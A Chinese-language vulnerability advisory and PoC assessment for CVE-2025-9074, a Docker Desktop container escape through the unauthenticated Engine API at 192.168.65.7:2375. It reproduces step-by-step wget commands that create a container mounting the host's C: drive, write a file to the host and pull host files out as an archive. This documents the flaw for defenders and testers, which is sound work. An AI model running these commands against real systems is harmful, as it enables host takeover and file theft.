## CVE-2025-9074 - Docker Desktop 容器逃逸 (Container Escape), 未授权API访问 (Unauthorized API Access)

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器逃逸 (Container Escape), 未授权API访问 (Unauthorized API Access)

**影响应用:** Docker Desktop

**危害等级:** 高危/严重

**CVSS评分:** 9.3

**影响版本:** Docker Desktop ≤ 4.44.3 (适用于Windows和macOS)

**利用条件:** 需要本地运行的Linux容器，且该容器能够通过默认子网（192.168.65.7:2375）访问Docker Engine API，无需认证。成功读写主机文件取决于容器运行用户与目标挂载目录的权限匹配。

**POC 可用性:** 10/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 0%

## 详情

CVE-2025-9074是一个影响Docker Desktop（Windows和macOS版本）的严重容器逃逸漏洞。该漏洞允许在本地运行的恶意Linux容器绕过隔离机制，无需任何认证或访问控制，即可直接访问Docker Engine API，通常通过默认子网地址192.168.65.7:2375进行。攻击者一旦在容器内获得立足点，便可利用此漏洞创建新的容器，并将主机文件系统挂载到新容器中，从而获得对主机文件系统的读写权限，实现完全的主机控制。

**POC有效性分析**：
所提供的POC是高度有效且完善的，它清晰地演示了CVE-2025-9074容器逃逸漏洞的利用过程。POC详细列出了在受影响的Docker Desktop版本（≤ 4.44.3）上重现漏洞的步骤，并提供了具体的`wget`命令示例，用于与Docker Engine API进行交互。利用流程分为两部分：首先，通过POST请求向API创建并启动一个新容器，该容器被配置为将主机的根目录（如Windows上的`C:\`）挂载到容器内的特定路径（如`/host_root`），然后在新容器内部执行命令向主机写入文件（`pwn.txt`）。其次，POC演示了如何通过GET请求从API获取主机上挂载目录的归档文件，从而验证容器能够读取主机上的敏感文件（如`readme.txt`）。POC中包含的截图直观地展示了主机文件被创建和读取的预期结果，充分证明了漏洞的真实性和可利用性。这些步骤逻辑清晰，易于理解和复现，使得此POC成为一个可靠且功能完整的概念验证工具，而非仅仅是理论说明。

**利用步骤**：
1. 在主机上（Windows或macOS），确保Docker Desktop版本不高于4.44.3。创建一个测试目录，例如`C:\test`，并在其中放置一个示例文件（如`readme.txt`）。
2. 启动一个简单的Linux容器，例如使用命令`docker run -it alpine '/bin/sh'`。
3. 在该容器内部，执行以下命令序列：
   - **创建并启动恶意容器以写入主机文件**：
     ```sh
     wget --header='Content-Type: application/json' \
       --post-data='{"Image":"alpine","Cmd":["sh","-c","echo pwned > /host_root/test/pwn.txt"],"HostConfig":{"Binds":["/mnt/host/c:/host_root"]}}' \
       -O - http://192.168.65.7:2375/containers/create > create.json
     cid=$(cut -d'"' -f4 create.json)
     wget --post-data='' -O - http://192.168.65.7:2375/containers/$cid/start
     ```
     （此步骤将创建一个新容器，挂载主机`C:\`到`/host_root`，并在主机`C:\test`下写入`pwn.txt`。）
4. 在主机上验证`C:\test\pwn.txt`是否已被创建。
5. **读取主机文件**：
   - 在初始容器内部执行以下命令以获取主机文件的归档：
     ```sh
     wget http://192.168.65.7:2375/containers/$cid/archive?path=/host_root/test -O test.tar
     tar -xvf test.tar
     cat test/readme.txt
     ```
     （此步骤将从主机挂载目录`/host_root/test`获取一个归档文件，并解压读取`readme.txt`内容。）
6. 验证容器是否成功读取了主机上的`readme.txt`文件内容。

**投毒风险分析**：
该POC的投毒风险被评估为0%，即极低。主要基于以下几个关键因素：
1. **代码透明度高**：POC提供的代码片段都是标准的shell命令，包括`wget`、`tar`和`cat`。这些命令直接明了，没有使用任何形式的代码混淆、加密或难以理解的编程技巧。
2. **无外部可疑依赖**：POC的执行不依赖于任何外部的、未经审查的脚本或可执行文件。所有操作都基于容器环境中常见的系统工具，大大降低了引入恶意代码的风险。
3. **明确的教育和研究目的**：POC的文档中明确指出其设计目的仅为“教育和研究”，旨在安全地演示漏洞原理，并且不包含“武器化利用代码”。这一声明增加了其可信度。
4. **无恶意负载**：POC执行的操作仅限于创建文件和读取文件，这些是验证容器逃逸并访问主机资源的关键步骤。代码中不包含任何植入后门、进行网络通信、窃取数据或建立持久化机制的指令。其行为完全与漏洞验证相符，不展示任何超出此范围的恶意意图。
5. **易于审查**：由于代码的简洁和透明性，安全研究人员可以轻松地逐行审查POC的每一个指令，确认其没有隐藏的恶意功能。这使得在执行POC之前进行彻底的安全评估成为可能。
综上所述，此POC旨在提供一个清晰、可控的漏洞演示环境，其设计和实现均未包含任何恶意或可疑行为，因此其本身不构成投毒风险。

**项目地址:** N/A

**漏洞详情:** https://www.cve.org/CVERecord?id=CVE-2025-9074
